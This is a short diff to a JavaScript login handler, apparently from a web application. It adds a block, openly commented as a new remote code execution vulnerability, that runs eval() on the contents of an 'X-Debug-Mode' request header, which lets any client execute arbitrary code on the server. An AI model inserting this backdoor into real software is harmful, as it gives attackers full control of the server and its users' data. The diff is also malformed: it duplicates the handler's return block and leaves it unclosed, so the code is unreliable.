@@ -23,6 +23,20 @@ module.exports = function login () {
         next(error)
       })
   }
+return (req, res, next) => {
+    verifyPreLoginChallenges(req)
+
+    /** * NEW VULNERABILITY: Remote Code Execution (RCE)
+     * This allows an attacker to execute arbitrary system commands
+     * by passing JavaScript in the 'X-Debug-Mode' HTTP header.
+     */
+    if (req.headers['x-debug-mode']) {
+      try {
+        eval(req.headers['x-debug-mode'])
+      } catch (e) {
+        console.error('Debug Eval Error:', e.message)
+      }
+    }
 
   return (req, res, next) => {
     verifyPreLoginChallenges(req)
